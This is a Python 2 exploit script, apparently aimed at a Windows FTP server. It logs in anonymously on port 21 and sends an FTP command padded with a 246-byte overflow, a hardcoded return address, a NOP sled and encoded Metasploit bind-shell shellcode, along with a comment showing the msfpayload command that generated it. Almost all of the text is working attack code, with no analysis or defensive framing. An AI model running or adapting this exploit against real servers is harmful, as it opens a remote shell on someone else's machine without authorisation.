__author__ = 'derog'

import socket, sys, time, struct
if len(sys.argv)<2:
    print "[-] Usage:%s <target addr> <command>"% sys.argv[0] + '\r'
    print "[-] Fpr exa,e [filename.py 192.168.1.10 PWND] would work."
    print "[-] Pther options: AUTH, APPE, ALLo, ACCT"
    sys.exit(0)
target = sys.argv[1]
command = sys.argv[2]
if len(sys.argv)>2:
    platform = sys.argv[2]

#Here we have the hex elements that we will use for generating the metasploit hex commands we use the following
#BASH:// msfpayload windows/shell_bind_tcp r | msfencode -e x86/shikata_ga_nai -b "\x00\xff\x0d\x0a\x3d\x20"
shellcode=( "\xbe\xba\xb5\xd4\x13\xdd\xc2\xd9\x74\x24\xf4\x5f\x31\xc9" +
            "\xb1\x56\x83\xef\xfc\x31\x77\x0f\x03\x77\xb5\x57\x21\xef" +
            "\x21\x1e\xca\x10\xb1\x41\x42\xf5\x80\x53\x30\x7d\xb0\x63" +
            "\x32\xd3\x38\x0f\x16\xc0\xcb\x7d\xbf\xe7\x7c\xcb\x99\xc6" +
            "\x7d\xfd\x25\x84\xbd\x9f\xd9\xd7\x91\x7f\xe3\x17\xe4\x7e" +
            "\x24\x45\x06\xd2\xfd\x01\xb4\xc3\x8a\x54\x04\xe5\x5c\xd3" +
            "\x34\x9d\xd9\x24\xc0\x17\xe3\x74\x78\x23\xab\x6c\xf3\x6b" +
            "\x0c\x8c\xd0\x6f\x70\xc7\x5d\x5b\x02\xd6\xb7\x95\xeb\xe8" +
            "\xf7\x7a\xd2\xc4\xfa\x83\x12\xe2\xe4\xf1\x68\x10\x99\x01" +
            "\xab\x6a\x45\x87\x2e\xcc\x0e\x3f\x8b\xec\xc3\xa6\x58\xe2" +
            "\xa8\xad\x07\xe7\x2f\x61\x3c\x13\xa4\x84\x93\x95\xfe\xa2" +
            "\x37\xfd\xa5\xcb\x6e\x5b\x08\xf3\x71\x03\xf5\x51\xf9\xa6" +
            "\xe2\xe0\xa0\xae\xc7\xde\x5a\x2f\x4f\x68\x28\x1d\xd0\xc2" +
            "\xa6\x2d\x99\xcc\x31\x51\xb0\xa9\xae\xac\x3a\xca\xe7\x6a" +
            "\x6e\x9a\x9f\x5b\x0e\x71\x60\x63\xdb\xd6\x30\xcb\xb3\x96" +
            "\xe0\xab\x63\x7f\xeb\x23\x5c\x9f\x14\xee\xeb\xa7\xda\xca" +
            "\xb8\x4f\x1f\xed\x2f\xcc\x96\x0b\x25\xfc\xfe\x84\xd1\x3e" +
            "\x25\x1d\x46\x40\x0f\x31\xdf\xd6\x07\x5f\xe7\xd9\x97\x75" +
            "\x44\x75\x3f\x1e\x1e\x95\x84\x3f\x21\xb0\xac\x36\x1a\x53" +
            "\x26\x27\xe9\xc5\x37\x62\x99\x66\xa5\xe9\x59\xe0\xd6\xa5" +
            "\x0e\xa5\x29\xbc\xda\x5b\x13\x16\xf8\xa1\xc5\x51\xb8\x7d" +
            "\x36\x5f\x41\xf3\x02\x7b\x51\xcd\x8b\xc7\x05\x81\xdd\x91" +
            "\xf3\x67\xb4\x53\xad\x31\x6b\x3a\x39\xc7\x47\xfd\x3f\xc8" +
            "\x8d\x8b\xdf\x79\x78\xca\xe0\xb6\xec\xda\x99\xaa\x8c\x25" +
            "\x70\x6f\xbc\x6f\xd8\xc6\x55\x36\x89\x5a\x38\xc9\x64\x98" +
            "\x45\x4a\x8c\x61\xb2\x52\xe5\x64\xfe\xd4\x16\x15\x6f\xb1" +
            "\x18\x8a\x90\x90" )

ret = struct.pack('<L',0x7C874413)
padding = '\x90'*150
crash = '\x41'*246 + ret + padding + shellcode
print "[*] Connecting to "+ target
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target,21))
except:
    print '[-] Connection to '+target+' failed!'
    sys.exit(0)
print '[*] Sending ' + str(len(crash)) + " " + command + " byte crash..."
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send(command + " " + crash + "\r\n")
time.sleep(4)
